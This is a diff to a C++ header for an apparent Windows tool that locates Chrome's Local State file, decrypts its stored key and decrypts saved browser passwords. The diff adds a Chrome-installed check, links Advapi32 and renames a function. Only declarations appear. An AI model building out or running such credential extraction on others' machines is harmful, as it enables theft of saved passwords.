@@ -17,6 +17,7 @@
 // Link against the required libraries
 #pragma comment(lib, "Crypt32.lib")
 #pragma comment(lib, "Shell32.lib")
+#pragma comment(lib, "Advapi32.lib")
 
 //using namespace std;
 using json = nlohmann::json;
@@ -30,6 +31,10 @@ using json = nlohmann::json;
 #define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
 #define warn(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
 #define info(msg, ...) printf("[i] " msg "\n", ##__VA_ARGS__)
+
+//Checks if Chrome is installed in the local machine.
+//@turn a bool stating if it is installed or not.
+bool IsChromeInstalled();
 
 // Finds the path to the Local State file.
 // @return The path to the Local State file as a wide string.
@@ -61,7 +66,7 @@ DATA_BLOB decryptKey(const std::string encrypted_key);
 // @param key The key used for decryption.
 // @param iv The initialization vector used for decryption.
 // @param decrypted The buffer to store the decrypted password.
-void passwordDecrypter(unsigned char* ciphertext, size_t ciphertext_len, unsigned char* key, unsigned char* iv, unsigned char* decrypted);
+void decryptPassword(unsigned char* ciphertext, size_t ciphertext_len, unsigned char* key, unsigned char* iv, unsigned char* decrypted);
 
 
 #endif // _WIN32
